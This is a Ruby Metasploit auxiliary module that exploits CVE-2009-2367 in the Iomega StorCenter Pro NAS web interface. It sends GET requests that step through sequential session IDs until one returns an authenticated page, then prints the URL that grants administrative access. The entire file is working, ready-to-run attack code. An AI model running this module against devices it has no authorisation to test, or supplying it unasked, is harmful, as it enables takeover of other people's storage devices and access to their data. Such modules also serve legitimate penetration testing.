##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::HttpClient

  def initialize
    super(
      'Name' => 'Iomega StorCenter Pro NAS Web Authentication Bypass',
      'Description' => %q{
        The Iomega StorCenter Pro Network Attached Storage device web interface increments sessions IDs,
        allowing for simple brute force attacks to bypass authentication and gain administrative
        access.
        },
      'References' => [
        [ 'OSVDB', '55586' ],
        [ 'CVE', '2009-2367' ],
      ],
      'Author' => [ 'aushack' ],
      'License' => MSF_LICENSE,
      'Notes' => {
        'Stability' => [CRASH_SAFE],
        'SideEffects' => [IOC_IN_LOGS],
        'Reliability' => []
      }
    )

    register_options(
      [
        OptInt.new('SID_MAX', [true, 'Maximum Session ID', 100])
      ]
    )
  end

  def run
    datastore['SID_MAX'].times do |x|
      print_status("Trying session ID #{x}")

      res = send_request_raw({
        'uri' => "/cgi-bin/makecgi-pro?job=show_home&session_id=#{x}",
        'method' => 'GET'
      }, 25)

      if res && res.to_s =~ /Log out/
        print_status("Found valid session ID number #{x}!")
        print_status("Browse to http://#{rhost}:#{rport}/cgi-bin/makecgi-pro?job=show_home&session_id=#{x}")
        break
      end
    rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout
      print_error("Unable to connect to #{rhost}:#{rport}")
      break
    rescue ::Timeout::Error, ::Errno::EPIPE => e
      vprint_error(e.message)
    end
  end
end
